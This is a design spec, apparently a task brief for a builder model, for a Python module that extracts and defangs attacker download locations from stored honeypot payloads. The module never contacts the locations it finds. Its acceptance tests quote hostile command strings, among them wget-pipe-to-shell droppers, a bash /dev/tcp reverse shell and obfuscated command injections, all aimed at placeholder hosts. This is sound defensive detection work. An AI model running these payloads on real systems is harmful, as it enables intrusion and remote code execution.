# B2: dropper ledger

Read `2026-09-19-wave1-overview.md` first.

**Owner files:** `droppers.py` (new). Nothing else. B1 adds the three lines
in `enrich.py` that call it; M adds the compose mount, the mapping and the
monitor.
**Builder model:** sonnet.

## What it is

Exploit payloads name where their second stage lives: `wget
http://…/x.sh`, `/dev/tcp/…/4444`, `tftp -g -r …`. Those locations are the
attacker's infrastructure, which is worth more than the scanning address.
This module reads payload text that is already stored, writes the locations
back onto the event, and keeps a first-seen ledger of them.

**It never fetches, resolves, pings or otherwise touches what it finds.**
No `socket`, no `urllib.request`, no `subprocess` import in this file; test
12 checks that.

## Interface

```python
INDICES = "tripwire-sentinel-*,tripwire-hits-*"
FIELDS = ("http_body", "payload_text", "http_requests", "body_excerpt", "path")
BOOK = "dropper-book"
LOOKBACK = "now-3d"
BATCH = 200
MAX_PER_EVENT = 16
MAX_URL = 512
IGNORE_HOSTS = frozenset({"schemas.xmlsoap.org", "www.w3.org", "schemas.microsoft.com",
                          "purenetworks.com", "localhost"})

def extract(text: str) -> list[dict]
def defang(url: str) -> str
def scan(client) -> int
def selftest() -> None        # python droppers.py --selftest
```

`client` is anything with `call(method, path, body=None) -> (status, doc)`,
which is `enrich.OpenSearch`. This file does not import `enrich`.

### `extract`

Pure. Returns dicts `{"url", "host", "port", "kind"}`, distinct by `url`, in
order of appearance, at most `MAX_PER_EVENT`.

Normalise first, on a copy: `urllib.parse.unquote_plus` once; `${IFS}` and
`$IFS` become a space; a leading `METHOD scheme://authority` on a request
line is cut down to `METHOD ` so that an open-proxy probe's own target is
not mistaken for a dropper (the rest of the line is still scanned).

Then three patterns:

| kind | matches | `url` recorded as |
|---|---|---|
| `url` | `(?:https?|ftp|tftp)://` followed by anything but whitespace, quotes, angle brackets, backtick, `;`, `|`, `)`, backslash; cut at the first `&&`; trailing `.,:'"` stripped | as written, lowercased scheme and host |
| `devtcp` | `/dev/(?:tcp|udp)/<host>/<port>` | `tcp://host:port` or `udp://host:port` |
| `bare` | after one of `wget`, `curl`, `tftp`, `ftpget`, `nc`, `ncat`, `busybox` within the same command (no `;`, `|`, `&` between): an IPv4 address, optional `:port`, optional `/path` | `host[:port][/path]` with no scheme |

Dropped: a host in `IGNORE_HOSTS` or under one of them; a host that is an
IP address and not `is_global`; anything over `MAX_URL`; a `bare` match that
is also inside a `url` match.

`host` is lowercased, without port or brackets. `port` is an int or absent.

### `defang`

`http` → `hxxp`, `ftp` → `fxp`, every `.` in the host part → `[.]`. The
ledger stores both forms; alerts and the digest only ever use the defanged
one, so nothing downstream turns it into a link.

### `scan`

1. Create `dropper-book` when absent: `url` keyword 512, `url_defanged`
   keyword 600, `host` keyword 256, `port` integer, `kind` keyword,
   `@timestamp` date, `first_source_ip` ip, `first_index` keyword;
   `dynamic: false`, no replicas.
2. Search `INDICES` with `ignore_unavailable`: `@timestamp >= LOOKBACK`, no
   `dropper.scanned`, at least one of `FIELDS` exists; oldest first; size
   `BATCH`; `_source` limited to `FIELDS`, `source.ip`, `@timestamp`.
3. For each hit: join the fields' values (lists joined with newlines), run
   `extract`, then `POST /<hit index>/_update/<id>` with `{"doc": {"dropper":
   {"scanned": true, "urls": [...], "hosts": [...]}}}`. `urls` and `hosts`
   are omitted when empty; `scanned` is always written so the event is not
   read again.
4. For each extracted item: `PUT /dropper-book/_create/<sha256 of url>`.
   409 means known and is not an error.
5. Returns the number of events stamped. Any non-2xx other than that 409 is
   logged with `ascii()` on anything that came from an event, and the loop
   continues.

`# ponytail:` one request per event and per new URL. At a few thousand
events a day that is nothing; move to `_bulk` when a pass takes longer than
the enricher's cycle.

## Acceptance tests (implement exactly these in `selftest()`)

1. `extract("cd /tmp; wget http://8.8.4.4/bins/x.sh -O- | sh")` gives one
   item: url `http://8.8.4.4/bins/x.sh`, host `8.8.4.4`, kind `url`. (The
   documentation ranges are not `is_global`, so the tests use a well-known
   public resolver address. Never a real attacker address in the repo.)
2. `extract("GET /shell?cd+/tmp;wget+http://8.8.4.4/a;chmod+777+a HTTP/1.1")`
   gives url `http://8.8.4.4/a`.
3. `extract("wget${IFS}http://8.8.4.4:81/b&&sh${IFS}b")` gives
   `http://8.8.4.4:81/b`, port 81.
4. `extract("bash -i >& /dev/tcp/8.8.4.4/4444 0>&1")` gives
   `tcp://8.8.4.4:4444`, kind `devtcp`, port 4444.
5. `extract("busybox tftp -g -r mips 8.8.4.4; curl -O 8.8.4.4:8080/arm")`
   gives two `bare` items.
6. `extract("GET http://judge.example/azenv.php HTTP/1.1")` gives `[]`.
7. `extract('<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">')`
   gives `[]`; so does `http://127.0.0.1/x` and `http://10.0.0.5/x`.
8. `extract("%77get%20http%3A%2F%2F8.8.4.4%2Fz")` gives `http://8.8.4.4/z`.
9. Thirty distinct URLs in one text give 16 items; the same URL thirty
   times gives one; a 600-character URL gives none.
10. `defang("http://evil.example.com:8080/a.sh") ==
    "hxxp://evil[.]example[.]com:8080/a.sh"`.
11. `scan()` against a fake client that records calls and serves two hits
    (one with a URL in `http_body`, one with only `path: "/"`): returns 2;
    both get `scanned: true`; only the first gets `urls`; one `_create`
    call; a second fake that answers 409 to `_create` and 500 to one
    `_update` makes `scan()` return 1 and raise nothing.
12. The module source contains none of `import socket`, `urllib.request`,
    `subprocess`, `http.client`.
13. `extract` on 1 MB of `"http://" * n`, on `"\x00" * 4096` and on `""`
    returns within a second and raises nothing.

## Edge-case matrix

| axis | applies | note |
|---|---|---|
| index made read-only by ISM | yes | `LOOKBACK` keeps the scan inside writable indices; an update failure is logged and skipped |
| receiver events | yes | `body_excerpt` and `path` |
| event with none of the fields | yes | never matched by the query, never stamped |
| hostile regex input | yes | test 13; patterns have no nested quantifiers |
| IDN, IPv6 literal hosts | yes | kept as written in `url`; `host` is the bracket-less literal |
| enricher running without this file mounted | yes | B1's guarded import: logs once, carries on |
| two enrichers at once | no | there is one |

## Where's the door handle

Operator: a "Droppers" saved search and a first-seen table (package M), a
`novel-dropper` alert whose body shows the defanged location and the address
that delivered it, and one digest line: new locations in the last day.
Start-up of the enricher logs `droppers: on` or `droppers: module not
found`. The README section M writes repeats the rule in the second
paragraph of this file.

## Validation

```
python -m py_compile droppers.py
python droppers.py --selftest
```

`git add droppers.py` only. Report deviations with reasons.
